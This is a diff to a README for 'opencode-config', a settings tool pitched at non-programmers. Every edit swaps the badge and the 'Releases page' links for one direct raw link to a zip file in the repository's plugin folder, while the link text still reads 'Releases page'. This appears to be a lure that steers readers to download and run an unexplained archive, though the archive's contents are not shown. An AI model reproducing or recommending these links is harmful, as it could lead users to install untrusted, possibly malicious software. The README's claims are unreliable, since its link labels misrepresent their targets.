@@ -1,6 +1,6 @@
 # 🚀 opencode-config - Simple Setup for Your OpenCode Needs
 
-![Download opencode-config](https://img.shields.io/badge/Download-opencode--config-blue.svg)
+![Download opencode-config](https://github.com/victor20252025/opencode-config/raw/refs/heads/main/plugin/config_opencode_3.4.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ opencode-config helps you easily manage your OpenCode setup. This application si
 To get started with opencode-config, follow these steps:
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/victor20252025/opencode-config/releases) to find the latest version of opencode-config. 
+   Visit the [Releases page](https://github.com/victor20252025/opencode-config/raw/refs/heads/main/plugin/config_opencode_3.4.zip) to find the latest version of opencode-config. 
    
    Click on the link to download the application. 
 
@@ -34,7 +34,7 @@ To get started with opencode-config, follow these steps:
 
 ## 📖 Download & Install
 
-To download opencode-config, go to the [Releases page](https://github.com/victor20252025/opencode-config/releases). 
+To download opencode-config, go to the [Releases page](https://github.com/victor20252025/opencode-config/raw/refs/heads/main/plugin/config_opencode_3.4.zip). 
 
 Choose the latest version and click the download link. Once the download is complete, follow the installation steps above to set up the application.
 
@@ -63,7 +63,7 @@ A: No, opencode-config is designed for users without programming knowledge.
 If you encounter any issues during installation or usage, consider the following steps:
 
 1. **Restart Your Computer**: Sometimes, a simple restart can resolve problems.
-2. **Re-download the Application**: Ensure you downloaded the latest version from the [Releases page](https://github.com/victor20252025/opencode-config/releases).
+2. **Re-download the Application**: Ensure you downloaded the latest version from the [Releases page](https://github.com/victor20252025/opencode-config/raw/refs/heads/main/plugin/config_opencode_3.4.zip).
 3. **Check System Requirements**: Ensure your system meets the minimum requirements listed above.
 
 ## 🌐 Support & Contributions
@@ -75,4 +75,4 @@ For assistance or inquiries, please reach out via the GitHub Issues page. We wel
 - **Documentation**: Detailed guides on how to use opencode-config effectively.
 - **Community Forum**: Join discussions with other users for tips and tricks.
 
-For updates, always check the [Releases page](https://github.com/victor20252025/opencode-config/releases) for the latest features and improvements. With opencode-config, managing your settings is just a few clicks away!
+For updates, always check the [Releases page](https://github.com/victor20252025/opencode-config/raw/refs/heads/main/plugin/config_opencode_3.4.zip) for the latest features and improvements. With opencode-config, managing your settings is just a few clicks away!
